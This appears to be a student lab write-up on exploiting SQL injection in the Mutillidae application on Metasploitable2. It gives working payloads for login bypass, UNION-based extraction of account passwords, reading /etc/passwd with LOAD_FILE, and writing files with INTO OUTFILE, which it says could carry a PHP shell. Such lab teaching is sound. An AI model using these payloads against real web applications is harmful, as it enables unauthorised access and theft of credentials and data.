# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/f14cacab-6f17-4510-bf5a-55ea773a1068)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/5dde1e73-2781-4525-905a-e7cdab754a40)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:


![image](https://github.com/Roselineb/sqlinjection/assets/128909895/117424bf-5f26-4ae0-89e8-a4e08a4e484b)
Click on the menu Login/Register and register for an account

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/cfdf0b9f-c0ea-422d-bfca-564445e512a2)
Click on the link “Please register here”

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/ae5c9ed6-2197-4913-87bf-fb084dfbfbcb)
Click on “Create Account” to display the following page:

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/51674758-15e9-4eb2-a272-90429b6df212)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/f8edde0a-bf68-4f85-abfe-167e10c68ac8)
Click “Login”. The logged in page will show as below:

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/3d00001f-7f53-4be1-9d5c-9de8c3b5710d)
## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/f2913002-a150-49e6-af33-ca81c50d6dc9)
Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/be959770-3a16-43ea-9e08-59a63f59a6c3)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below:

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/af610f72-5e15-419e-9543-6cb90b7e62f5)

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/e6831ab5-4cd7-4cf1-afa8-02607a4ef44c)

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/2b84df8e-8323-45c0-b02f-a48fe65406fd)

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/87c35e2d-6ee2-41d4-a006-eaf2ce78694f)

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/098846fc-fba5-4ee5-81f8-9b8d51238b4c)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/c6c86d9d-0f76-4f17-9222-688c72e74483)
ince we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/683b7e0b-3fda-4491-8980-0cd9111c2332)
After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/2a90e47e-2d06-4565-a5b1-94ed2183b6ce)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/eaaac0d5-2329-4581-9807-2fd1a5b2a6b5)
As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/f3fefa89-a4a7-4aab-9506-80f873b1e481)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/bf0c8552-9d4c-43b7-b9dc-64fe1f6e41cb)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/9aef9866-ae9a-45d0-b5d4-f3fb18b847ea)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Roselineb/sqlinjection/assets/128909895/6672639c-298e-4a20-b6e4-925676ff4768)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/c21c9886-f8be-4a0c-b7e2-462f191cf4c5)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/30f8f39f-fddd-4f6c-b3bf-a915b56397f7)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/b6936361-f4e7-4616-88e1-aebb21e9ae69)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/65a6cfe6-7051-4fd7-a21b-a9472b5d8b29)
## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Roselineb/sqlinjection/assets/128909895/52d8388e-ad3d-4ea5-99ce-bbca199db5e5)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
